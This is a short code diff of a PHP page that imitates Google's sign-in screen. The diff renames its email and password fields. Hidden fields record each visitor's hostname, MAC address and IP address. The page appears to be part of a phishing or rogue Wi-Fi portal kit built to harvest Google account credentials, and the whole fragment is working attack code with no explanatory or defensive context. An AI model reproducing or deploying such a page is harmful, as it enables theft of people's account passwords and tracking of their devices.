@@ -30,8 +30,8 @@ require_once('helper.php');
 	<img src="assets/img/1ckkcu79ho.gif" alt="">
 	<h1>Sign in</h1>
 	<h2>with your Google Account</h2>
-	<input id="user" type="text" name="email" placeholder="Enter your email"  _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
-	<input type="password" name="password" placeholder="Enter your password" autocorrect="off" autocomplete="off" autocapitalize="off" required>
+	<input id="user" type="text" name="email_google" placeholder="Enter your email"  _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
+	<input type="password" name="password_google" placeholder="Enter your password" autocorrect="off" autocomplete="off" autocapitalize="off" required>
 	<input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
 	<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
 	<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
